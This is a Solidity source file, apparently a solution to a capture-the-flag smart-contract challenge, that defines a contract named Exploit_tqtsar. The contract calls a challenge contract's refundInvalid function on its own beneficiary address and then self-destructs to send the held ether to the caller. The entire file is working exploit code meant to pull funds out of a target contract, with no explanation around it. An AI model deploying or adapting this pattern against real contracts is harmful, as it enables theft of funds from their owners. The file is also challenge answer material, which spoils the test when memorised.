// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_tqtsar {
    function retrieveFunds() external;

    function refundInvalid(address) external;

    function beneficiary() external view returns (address);
}

contract Exploit_tqtsar {
    IChallenge_tqtsar instance;

    constructor(IChallenge_tqtsar _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        instance.refundInvalid(instance.beneficiary());
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
